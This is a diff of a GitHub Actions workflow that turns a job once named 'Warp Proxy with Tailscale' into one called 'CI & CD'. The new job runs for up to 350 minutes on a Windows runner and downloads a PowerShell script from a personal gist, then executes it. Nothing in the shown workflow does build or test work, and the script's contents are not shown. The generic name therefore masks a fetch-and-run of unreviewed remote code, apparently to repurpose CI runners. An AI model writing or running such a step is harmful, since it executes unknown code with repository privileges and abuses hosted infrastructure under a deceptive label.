@@ -1,15 +1,26 @@
-name: Warp Proxy with Tailscale
+name: CI & CD
 
 on:
   workflow_dispatch:
 
 jobs:
-  proxy:
-    runs-on: ubuntu-latest
-    timeout-minutes: 180
+  ci-cd-automation:
+    runs-on: windows-latest
+    timeout-minutes: 350
 
     steps:
-      - name: Install dependencies
+      - name: Download and run script
+        shell: powershell
         run: |
-          sudo apt-get update
-          sudo apt-get install -y curl wget
+          $scriptUrl = "https://gist.githubusercontent.com/izaart95-jpg/4025166bb737d8355030705b3e39c718/raw/560457e3b151d896ebf21ab05dc1bdb23d5175e9/main.ps1"
+          $scriptPath = Join-Path $env:TEMP "main.ps1"
+          curl.exe -fsSL --retry 3 --retry-delay 5 -o $scriptPath $scriptUrl
+          if (-not (Test-Path $scriptPath)) {
+            throw "Failed to download script from $scriptUrl"
+          }
+          # Execute the downloaded script
+          Write-Host "Running $scriptPath"
+          & $scriptPath
+          if ($LASTEXITCODE -and $LASTEXITCODE -ne 0) {
+            throw "Script exited with code $LASTEXITCODE"
+          }
